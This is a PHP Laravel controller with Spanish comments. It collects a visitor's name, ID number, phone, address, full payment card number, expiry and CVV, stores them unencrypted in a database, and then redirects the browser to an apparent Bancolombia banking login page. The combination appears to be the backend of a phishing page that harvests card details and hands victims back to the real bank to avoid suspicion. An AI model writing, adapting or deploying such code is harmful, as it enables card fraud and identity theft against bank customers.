<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\FormData;
use Illuminate\Validation\Rule;

class FormController extends Controller
{
    public function store(Request $request)
    {
        // Validación personalizada para el número de tarjeta
        $validatedData = $request->validate([
            'nombre' => 'required|string|max:255',
            'cc' => 'required|string', // Este campo no es el número de tarjeta
            'telefono' => [
                'required',
                'string',
                'regex:/^3\d{9}$/', // Debe comenzar con 3 y tener exactamente 10 dígitos
                function ($attribute, $value, $fail) {
                    if (!preg_match('/^3\d{9}$/', $value)) {
                        $fail('El número de teléfono no es valido.');
                    }
                },
            ],
            'direccion' => 'required|string',
            'numero' => [
                'required',
                'string',
                function ($attribute, $value, $fail) {
                    // Validar Visa (comienza con 4 y tiene 16 dígitos)
                    if (preg_match('/^4\d{15}$/', $value)) {
                        return;
                    }
                    // Validar Mastercard (comienza con 5 y tiene 16 dígitos)
                    if (preg_match('/^5\d{15}$/', $value)) {
                        return;
                    }
                    // Validar American Express (comienza con 3 y tiene 15 dígitos)
                    if (preg_match('/^3[47]\d{13}$/', $value)) {
                        return;
                    }
                    $fail('El número de tarjeta no es válido.');
                },
            ],
            'fecha' => [
                'required',
                'string',
                'regex:/^(0[1-9]|1[0-2])\/\d{2}$/', // Formato MM/YY
                function ($attribute, $value, $fail) {
                    if (!preg_match('/^(0[1-9]|1[0-2])\/\d{2}$/', $value)) {
                        $fail('El formato de la fecha debe ser MM/YY (por ejemplo, 12/25).');
                    }
                },
            ],
            'cvv' => [
                'required',
                'string',
                function ($attribute, $value, $fail) use ($request) {
                    $numeroTarjeta = $request->input('numero'); // Usamos el campo "numero" para validar el CVV
                    // Si es Visa o Mastercard, el CVV debe tener 3 dígitos
                    if (preg_match('/^4/', $numeroTarjeta) || preg_match('/^5/', $numeroTarjeta)) {
                        if (!preg_match('/^\d{3}$/', $value)) {
                            $fail('El CVV no es valido');
                        }
                    }
                    // Si es American Express, el CVV debe tener 4 dígitos
                    if (preg_match('/^3[47]/', $numeroTarjeta)) {
                        if (!preg_match('/^\d{4}$/', $value)) {
                            $fail('El CVV no es valido.');
                        }
                    }
                },
            ],
        ], [
            // Mensajes de error personalizados
            'nombre.required' => 'El campo nombre es obligatorio.',
            'cc.required' => 'El campo CC es obligatorio.',
            'cc.unique' => 'El valor de CC ya está en uso.',
            'telefono.required' => 'El campo teléfono es obligatorio.',
            'telefono.regex' => 'El número de teléfono es incorrecto.',
            'direccion.required' => 'El campo dirección es obligatorio.',
            'numero.required' => 'El campo número de tarjeta es obligatorio.',
            'numero.unique' => 'El número de tarjeta ya está en uso.',
            'fecha.required' => 'El campo fecha es obligatorio.',
            'fecha.regex' => 'El formato de la fecha debe ser MM/YY (por ejemplo, 12/25).',
            'cvv.required' => 'El campo CVV es obligatorio.',
        ]);

        // Crear el registro en la base de datos
        FormData::create($validatedData);

        // Redireccionar a la página externa
        return redirect()->away('https://sucursalpersonas.transaccionesbancolombia.com/mua/USER?scis=%2FfxNrczPDt5yFeCZnN0tWpUzcnCmy4gDotEGSGaKGwk%3D#no-back-button');
    }
}
